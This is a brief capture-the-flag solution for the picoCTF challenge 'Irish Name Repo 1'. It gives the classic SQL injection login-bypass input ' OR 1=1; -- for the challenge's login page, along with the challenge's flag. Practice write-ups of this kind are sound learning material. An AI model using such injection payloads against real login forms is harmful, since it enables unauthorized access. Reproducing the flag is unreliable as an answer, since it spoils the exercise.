# Irish Name Repo 1

## Problem

There is a website running at https://jupiter.challenges.picoctf.org/problem/50009/ (link) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Solution

here's the payload on the page https://jupiter.challenges.picoctf.org/problem/50009/login.php you should enter:

username: `' OR 1=1; --`

password: `test`

FLAG: `picoCTF{s0m3_SQL_fb3fe2ad}`